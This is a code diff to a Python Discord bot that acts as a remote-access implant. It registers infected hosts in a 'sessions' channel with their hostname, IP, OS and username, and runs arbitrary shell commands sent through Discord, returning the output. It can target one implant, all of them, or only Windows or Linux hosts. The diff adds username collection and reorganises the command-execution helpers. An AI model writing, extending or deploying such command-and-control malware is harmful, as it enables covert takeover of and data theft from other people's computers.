@@ -9,13 +9,13 @@ from discord.ext import commands
 from subprocess import check_output
 from datetime import datetime, timedelta, timezone
 
-# constants
+# constants, configs, globals
 target_channel_name = "general"
 sessions_channel_name = "sessions"
 max_msg_size = 2000
 cmd_prefix = '>'
 
-# configure session reactions
+## configure session reactions
 good_react = '🟩'
 mins_stale = 2
 stale_react = '🟨'
@@ -23,12 +23,12 @@ mins_dead = 5
 dead_react = '🟥'
 mins_remove = 10
 
-# setup bot
+## setup bot
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix=cmd_prefix, intents=intents)
 
-# store instance of Implant
+## store instance of Implant
 global implant
 
 # keep track of implant stuff
@@ -41,6 +41,7 @@ class Implant:
 		self.hostname = self.get_hostname()
 		self.ip = self.get_ip()
 		self.os = self.get_os()
+		self.user = self.get_user()
 		self.note = ""
 
 	def get_channel(self, channel_name):
@@ -65,7 +66,6 @@ class Implant:
 			return run_cmd("hostname")
 		except Exception as ex:
 			log_warn(f'Error getting hostname: {ex}')
-			log_warn(ex)
 			return "?"
 	
 	def get_ip(self):
@@ -82,11 +82,18 @@ class Implant:
 			log_warn(f'Error getting os: {ex}')
 			return "?"
 
+	def get_user(self):
+		try:
+			return run_cmd("whoami")
+		except Exception as ex:
+			log_warn(f'Error getting username: {ex}')
+			return "?"
+
 # helper functions
 def get_datetime():
 	return time.strftime('[%Y-%m-%d %H:%M:%S]')
 
-# these are to console
+## logging
 def log_msg(msg):
 	print(f'{get_datetime()} {msg}')
 
@@ -102,7 +109,7 @@ def log_err(msg):
 def log_warn(msg):
 	log_msg(f'[!] {msg}')
 
-# these three are to the discord server
+## send messages to discord server
 async def send_msg(ctx, msg):
 	try:
 		if len(msg) >= max_msg_size:
@@ -141,6 +148,7 @@ async def reply_thread_once(ctx, msg):
 	except Exception as ex:
 		log_warn(f'Error replying to thread: {ex}')
 
+## remove an old message in the sessions channel
 async def delete_session_entry(i_id):
 	# delete any duplicates of self
 	messages = [message async for message in implant.sessions_channel.history(limit=100)]
@@ -151,21 +159,64 @@ async def delete_session_entry(i_id):
 			except Exception as ex:
 				log_warn(f'Unable to delete message id {message.id}: {ex}')
 
-def run_cmd(cmd):
-	return check_output(cmd, shell=True).decode()
-
+## get string containing implant info
 def get_implant_data_str():
-	return f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os}`{f' | Note: {implant.note}' if implant.note not "" else ""}'
+	return f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os}` | User: `{implant.user}`{f' | Note: {implant.note}' if implant.note not "" else ""}'
+
+## helpers for running a command
+### actually run the command
+def run_cmd(cmd):
+	try:
+		return check_output(cmd, shell=True).decode()
+	except Exception as ex:
+		return (f'Error running command {cmd}: {ex}')
+
+### wrap command output with text
+async def _cmd(ctx, arg):
+	log_info(f'{implant.id} Command recieved: {arg}')
+	await reply_thread(ctx, f'ID: `{implant.id}` Command recieved: `{arg}`\n\nOutput: ```{run_cmd(arg)}```')
+
+### do things for different command targets
+#### individual
+async def i_cmd(ctx, arg):
+	imp_id = arg[:arg.index(" ")]
+	if not imp_id == implant.id:
+		return
+
+	arg = arg[(arg.index(" ")+1):]
+
+	await _cmd(ctx, arg)
+
+#### all
+async def a_cmd(ctx, arg):
+	await _cmd(ctx, arg)
+
+#### windows
+async def w_cmd(ctx, arg):
+	if not implant.os == 'Windows':
+		return
+	await _cmd(ctx, arg)
+
+#### linux
+async def l_cmd(ctx, arg):
+	if not implant.os == 'Linux':
+		return
+	await _cmd(ctx, arg)
 
 # bot land
-# events
+## events
+### i put setup stuff in here and the while loop for the session channel
 @bot.event
 async def on_ready():
 	log_info(f'Logged in as {bot.user}')
 	log_info(f'Performing init actions for implant')
 
+	# setup tasks are done in the constructor for Implant
 	global implant
 	implant = Implant()
+
+	log_good(f'Done performing init actions for implant')
+	log_info(f'Current ID: {implant.id}')
 
 	msg = ""
 	msg += f'-----------------[NEW SESSION]-----------------\n'
@@ -173,12 +224,10 @@ async def on_ready():
 	msg += f'| Hostname: `{implant.hostname}`'
 	msg += f'| IP: `{implant.ip}`\n'
 	msg += f'| OS: `{implant.os}`\n'
+	msg += f'| Username: `{implant.user}`\n'
 	msg += f'--------------------------------------------------'
-	
-	log_good(f'Done performing init actions for implant')
-	log_info(f'Current ID: {implant.id}')
-
 	try:
+		# tell the server we exist
 		await implant.main_channel.send(msg)
 	except Exception as ex:
 		log_err(f'Failed to send new session message to server: {ex}')
@@ -190,11 +239,11 @@ async def on_ready():
 
 		log_info(f'Running sessions loop, current utc time: {utc_now}')
 
-		# stale
+		# stale timestamp
 		stale = utc_now-timedelta(minutes=mins_stale)
-		# dead
+		# dead timestamp
 		dead = utc_now-timedelta(minutes=mins_dead)
-		# remove
+		# remove timestamp
 		remove = utc_now-timedelta(minutes=mins_remove)
 
 		# delete any old messages or duplicates of self, change react
@@ -224,7 +273,7 @@ async def on_ready():
 				except Exception as ex:
 					log_warn(f'Unable to clear or add reaction to msg ID {message.id}: {ex}')
 
-		log_info(f'Adding new session message for implant ID: {implant.id}') #"Windows" if os.name == 'nt' else "Linux"
+		log_info(f'Adding new session message for implant ID: {implant.id}')
 		# post new message
 		try:
 			note = implant.note
@@ -235,8 +284,8 @@ async def on_ready():
 
 		log_info(f'Sleeping')
 		await asyncio.sleep(60)
-	
 
+### fires when the bot sees a message. just logs that a message was seen
 @bot.event
 async def on_message(message):
 	if message.author == bot.user:
@@ -245,7 +294,7 @@ async def on_message(message):
 	log_info(f'Observed message ID {message.id} from {message.author.name} with content \"{message.content}\"')
 	await bot.process_commands(message)
 
-# bot commands
+## bot commands
 @bot.command()
 async def ping(ctx):
 	'''
@@ -256,46 +305,6 @@ async def ping(ctx):
 	# Send it to the user
 	await reply_thread_once(ctx, f'Current latency: `{latency}`s')
 
-# helpers for cmd
-
-# actually run the command
-def run_cmd(cmd):
-	try:
-		return check_output(cmd, shell=True).decode()
-	except Exception as ex:
-		return (f'Error running command {cmd}: {ex}')
-
-async def _cmd(ctx, arg):
-	log_info(f'{implant.id} Command recieved: {arg}')
-	await reply_thread(ctx, f'ID: `{implant.id}` Command recieved: `{arg}`\n\nOutput: ```{run_cmd(arg)}```')
-
-# individual
-async def i_cmd(ctx, arg):
-	imp_id = arg[:arg.index(" ")]
-	if not imp_id == implant.id:
-		return
-
-	arg = arg[(arg.index(" ")+1):]
-
-	await _cmd(ctx, arg)
-
-# all
-async def a_cmd(ctx, arg):
-	await _cmd(ctx, arg)
-
-# windows
-async def w_cmd(ctx, arg):
-	if not implant.os == 'Windows':
-		return
-	await _cmd(ctx, arg)
-
-# linux
-async def l_cmd(ctx, arg):
-	if not implant.os == 'Linux':
-		return
-	await _cmd(ctx, arg)
-
-# process commands
 @bot.command(rest_is_raw=True)
 async def cmd(ctx, *, arg):
 	'''
